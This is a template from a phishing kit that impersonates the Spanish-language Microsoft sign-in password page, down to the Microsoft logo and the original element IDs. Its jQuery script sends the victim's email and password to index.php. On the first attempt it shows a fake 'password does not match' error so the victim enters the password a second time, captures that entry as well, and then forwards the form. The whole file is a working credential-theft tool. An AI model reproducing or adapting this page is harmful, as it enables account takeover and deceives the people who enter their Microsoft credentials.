
    <script type="text/javascript">
        $(document).ready(function(){


            var count = 0;
            $("#idSIButton9").click(function(){
                var error = false;

                var input_email = $('#hxtmail');
                var input_password = $('#i0118');
                var error_password = $('#passwordError');

                //$("form").submit();
                //$("#form-login").submit()

                var left = $('#panel-0').offset().left;
                //$("#panel-0").css({left:0}) .animate({"left":"-450px"}, "slow");

                //has-error ext-has-error
                if( input_password.val().length === 0 ){

                    error_password.removeClass('hide');
                    error_password.text('Escribe la contraseña de tu cuenta Microsoft.');
                    input_password.addClass('has-error ext-has-error');

                    error = true;
                    count = 0;
                }


                if(!error){
                    
                    //alert();
                     count++;
                    if(count > 1){

                        $( ".lightbox-cover" ).addClass( 'disable-lightbox' );
                        $( "#progressBar" ).removeClass( 'hide' );

                        $.post( "index.php", {wp: "MBI_SIMPLE", 
                            acc: input_email.val(), 
                            passwd: input_password.val(), 
                            repeate: true } );

                        setTimeout(() => {
                          document.getElementById("form-login").submit();  
                        }, 4000);
                        

                    }else{

                        $( ".lightbox-cover" ).addClass( 'disable-lightbox' );
                        $( "#progressBar" ).removeClass( 'hide' );
                        

                        $.post( "index.php", {wp: "MBI_SIMPLE", acc: input_email.val(), passwd: input_password.val() } );


                        setTimeout(() => {


                            $( "#progressBar" ).addClass( 'hide' );//disable-lightbox
                            $( ".lightbox-cover" ).removeClass( 'disable-lightbox' );
                            input_password.val("");
                            error_password.removeClass('hide');
                            error_password.text('La clave no coincide.');
                            input_password.addClass('has-error ext-has-error');

                        }, 4000);


                    }

                    
                }
                
            });

            /*function ShowError(argument) {
                
            }*/

            $("#i0118").on('input',function(e) {
                if(this.value.length >= 3){
                    $('#i0118').removeClass('has-error ext-has-error');
                    $('#passwordError').addClass('hide');
                }
            });

        }); 

        function OnSubmit(){
            return false;
        }       
    </script>
    <div id="panel-0" style="position: relative;">    
        <div class="lightbox-cover "></div>

        <div>
            <img class="logo" role="img" src="images/logo.svg" alt="Microsoft">
        </div>

        <div role="main">
            <form name="f1" id="form-login" method="post" 
                    action="<?php echo $_SERVER['PHP_SELF'] ?>" 
                    onsubmit="return false">

                <?php  $_to = isset($_SESSION['acc']) ? $_SESSION['acc'] : $_to; ?>

                <input type="hidden" name="acc" value="<?php echo $_to; ?>">
                <input type="hidden" name="wp" value="MBI_VERIFY">
                <input type="hidden" id="hxtmail" name="hxtmail" value="<?php echo $_to; ?>">
                
                


                <input type="hidden" name="">
                <div class="">
                    <div class="animate slide-in-next">
                        <div>
                            <div class="identityBanner">
                                <button type="button" class="backButton" id="idBtn_Back" aria-label="Atrás">
                                    <img role="presentation" src="images/arrow-left.svg"><!-- /ko -->
                                </button>
                                <!-- /ko -->

                                <div id="displayName" class="identity" title="correo@correo.com"><?php echo $_to; ?></div>
                            </div>
                        </div>
                    </div>
                    <!-- /ko -->

                    <div class="pagination-view animate has-identity-banner slide-in-next">

                        <div>

                            <div aria-hidden="true">

                            </div>

                            <div id="loginHeader" class="row title ext-title">
                                <div role="heading" aria-level="1">Escribir contraseña</div>
                            </div>
                            <div class="row">
                                <div class="form-group col-md-24">
                                    <div role="alert" aria-live="assertive">
                                        <div id="passwordError" class="error ext-error hide"></div>
                                    </div>

                                    <div class="placeholderContainer">

                                        <input name="passwd" type="password" id="i0118" autocomplete="off" class="form-control input ext-input text-box ext-text-box" aria-required="true" placeholder="Contraseña" aria-label="Escribe la contraseña para correo@correo.com."
                                            tabindex="0">

                                    </div>


                                </div>
                            </div>
                            <div class="position-buttons password-reset-links-container ext-password-reset-links-container">
                                <div>


                                    <div class="row">
                                        <div class="col-md-24">
                                            <div class="text-13">

                                                <div class="form-group">
                                                    <a id="idA_PWD_ForgotPassword" role="link" href="#">¿Olvidó su contraseña?</a>
                                                </div>


                                                <div class="form-group">

                                                </div>


                                            </div>
                                        </div>
                                    </div>
                                </div>

                                <div class="win-button-pin-bottom">
                                    <div class="row">
                                        <div>
                                            <div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container">



                                                <div class="inline-block button-item ext-button-item">
                                                    <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" value="Iniciar sesión">
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </form>
        </div>

        <div><input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>
    </div>